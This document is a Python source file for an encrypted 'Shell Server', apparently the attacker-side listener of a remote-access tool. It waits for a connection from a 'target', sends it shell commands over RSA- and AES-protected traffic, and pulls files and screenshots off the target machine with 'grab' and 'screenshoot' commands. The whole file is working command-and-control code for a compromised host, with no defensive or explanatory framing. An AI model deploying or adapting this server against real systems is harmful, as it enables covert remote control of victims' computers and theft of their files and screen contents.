# TCP Server
from socket import socket, AF_INET, SOCK_STREAM
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import os

class Server:
    ''' Shell Server '''
    def __init__(self):
        self.IP = '<SERVER-IP-ADDRESS>'
        self.PORT = 8080
        self.key = os.urandom(32)   # generate random 32 bytes key
        self.USERNAME = 'User@User'
        
    def str_xor(self, s1, s2):
        ''' Encrypt/Decrypt function '''
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

    def encrypt_AES_KEY(self, KEY):
        ''' Encrypt using RSA public key '''
        # read pem file or embed key to script
        publickey = open('src/public.pem', 'r').read()
        encryptor = RSA.importKey(publickey)
        cipher = PKCS1_OAEP.new(encryptor)
        encriptedData = cipher.encrypt(KEY)
        return encriptedData

    def encrypt(self, message):
        ''' AES encrypt algorithm using CTR mode, takes bytes variable '''
        iv = os.urandom(16)
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
        encrypto = AES.new(self.key, AES.MODE_CTR, counter=ctr)
        return iv + encrypto.encrypt(message)

    def decrypt(self, message):
        ''' AES decrypt algorithm using CTR mode, takes bytes variable '''
        iv = message[:16]
        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
        decrypto = AES.new(self.key, AES.MODE_CTR, counter=ctr)
        return decrypto.decrypt(message[16:])

    def transfer(self, conn, command):
        ''' receive transfer file '''
        conn.send(self.encrypt(command.encode()))
        filename = command.split()[-1]
        if filename == command:
            filename = 'screen.jpg'
        f = open(filename, 'wb')
        while True: 
            bits = conn.recv(1024)
            if b'Unable to find out the file' in bits:
                print('[!] Unable to find out the file')
                break
            if bits == b'DONE':
                print('[*] Transfer completed ')
                f.close()
                break
            f.write(bits)

    def connect(self):
        ''' listen for client connection '''
        s = socket(AF_INET, SOCK_STREAM) 
        # define the server IP and the listening port
        s.bind((self.IP, self.PORT)) 
        # define the backlog size, since we are expecting a single connection from a single
        # target we will listen to one connection
        s.listen(1) 
        print(f'[*] Listening for incoming TCP connection on port {self.PORT}')
        # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
        # port in a tuple format (IP,port)
        conn, addr = s.accept() 
        print('[+] Connection Received: ', addr)
        # send encrypted key
        conn.send(self.encrypt_AES_KEY(self.key))
        self.USERNAME = self.decrypt(conn.recv(1024)).decode()
        while True:
            # Get user input and store it in command variable
            command = input(f"{self.USERNAME}> ") 
            
            if 'terminate' in command: 
                # If we got terminate command, inform the client and close the connect and break the loop
                conn.send(self.encrypt('terminate'.encode()))
                conn.close()
                break
            elif 'grab' in command or 'screenshoot' in command:    
                # if we received grab keyword from the user input, then this is an indicator for
                # file transfer operation, hence we will call transfer function
                self.transfer(conn, command)
            else:
                # Otherwise we will send the command to the target
                conn.send(self.encrypt(command.encode()))
                # and print the result that we got back
                print(self.decrypt(conn.recv(1024)).decode()) 

def main():
    s = Server()
    s.connect()

if __name__ == "__main__":
    main()